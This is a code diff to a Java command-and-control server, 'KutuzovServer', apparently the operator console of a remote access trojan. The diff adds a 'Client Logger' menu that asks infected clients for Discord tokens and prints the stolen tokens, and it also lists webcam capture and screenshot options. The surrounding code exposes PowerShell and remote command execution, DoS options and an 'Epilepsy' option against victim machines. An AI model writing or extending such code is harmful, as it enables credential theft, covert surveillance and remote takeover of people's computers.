@@ -5,6 +5,9 @@ import com.google.gson.JsonObject;
 import com.google.gson.stream.JsonReader;
 import me.kutuzov.packet.*;
 import me.kutuzov.packet.bukkit.*;
+import me.kutuzov.packet.logger.CSTokenResponse;
+import me.kutuzov.packet.logger.SCTokenRequest;
+import me.kutuzov.packet.logger.types.TokenType;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.kftp.KFTPPanel;
@@ -318,6 +321,47 @@ public class KutuzovServer {
         }
     }
 
+    private void user_list_client_logger(Client client) {
+        clearConsole();
+        pnl("Client Logger Options:");
+        pnl("  0) Back");
+        pnl("  1) Discord Token");
+        pnl("  2) Webcam Capture");
+        pnl("  3) Screenshot");
+        pwl("Option: ");
+
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        clearConsole();
+
+        switch (option) {
+            case 1: {
+                try {
+                    client.sendPacket(new SCTokenRequest(TokenType.DISCORD));
+                } catch(Exception exception) {
+                    exception.printStackTrace();
+                    pnl("Could not send SCTokenRequest packet with type DISCORD.");
+
+                    trySleep(5000);
+                    break;
+                }
+
+                CSTokenResponse response = (CSTokenResponse) client.readPacket();
+                if(response.type != TokenType.DISCORD)
+                    pnl("WARNING! The received token is not a DISCORD token, is a " + response.type.name() + " token!");
+
+                pnl("Received token(s)<" + response.tokens.length + ">:");
+                for(int i = 0; i < response.tokens.length; i++)
+                    pnl("  - " + response.tokens[i]);
+                pnl("Press 0 to continue.");
+            } break;
+
+            case 0: return;
+            default:
+                break;
+        }
+    }
+
     private void user_list_header(Client client) {
         pnl("CLIENT VERSION: " + client.getVersion());
         pnl("ID: " + client.getIdentifierName());
@@ -330,7 +374,7 @@ public class KutuzovServer {
     private void user_list_client_windows(Client client) {
         clearConsole();
         user_list_header(client);
-        pnl("Options: ");
+        pnl("Windows Client Options: ");
         pnl("  0) Go back");
         pnl("  1) Epilepsy");
         pnl("  2) Powershell");
@@ -421,7 +465,7 @@ public class KutuzovServer {
     private void user_list_client_unix(Client client) {
         clearConsole();
         user_list_header(client);
-        pnl("Options: ");
+        pnl("Unix Client Options: ");
         pnl("  0) Go back");
         pnl("  1) Execute command");
         pwl("Option: ");
@@ -743,6 +787,10 @@ public class KutuzovServer {
 
             case 2:
                 user_list_client_dos_options(client);
+                break;
+
+            case 3:
+
                 break;
 
             case 4:
